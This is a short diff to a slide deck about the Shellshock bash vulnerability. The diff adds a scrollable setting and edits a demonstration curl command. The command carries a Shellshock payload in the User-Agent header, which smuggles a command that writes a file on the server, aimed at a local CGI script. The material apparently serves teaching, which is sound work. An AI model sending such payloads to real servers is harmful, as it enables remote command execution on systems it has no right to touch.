@@ -3,6 +3,7 @@ Shellshock
 :description: Shellshock bug
 :deckjs_theme: swiss
 :deckjs_transition: horizontal-slide
+:scrollable:
 
 == Shellshock
 
@@ -151,7 +152,7 @@ EOF
 
 [source,bash]
 -------------------------------------------
-$ curl -k -H ‘User-Agent: () { :;}; echo "Your system has been hacked!" > /tmp/hacker’ https://localhost/cgi-bin/bashbug.sh
+$ curl -H ‘User-Agent: () { :;}; echo "Your system has been hacked!" > /tmp/hacker’ https://localhost/cgi-bin/bashbug.sh
 -------------------------------------------
 
 
